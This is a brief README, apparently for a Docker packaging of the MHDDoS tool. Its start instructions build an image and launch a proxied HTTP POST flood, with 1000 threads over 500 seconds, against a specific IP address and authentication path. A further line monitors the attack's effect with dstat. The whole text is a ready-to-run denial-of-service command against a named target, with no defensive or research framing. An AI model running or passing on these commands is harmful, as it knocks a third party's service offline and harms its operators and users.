# mhd
HOW TO START
docker build -t mhd:0 .
docker run -d -it mhd:0 python3 /MHDDoS/start.py POST https://185.170.2.7/sc1/authreq 6 1000 proxy.txt 20 500 tmp.post debug=info

check stat 
docker run -d -it mhd:0 tools.py -> dstat
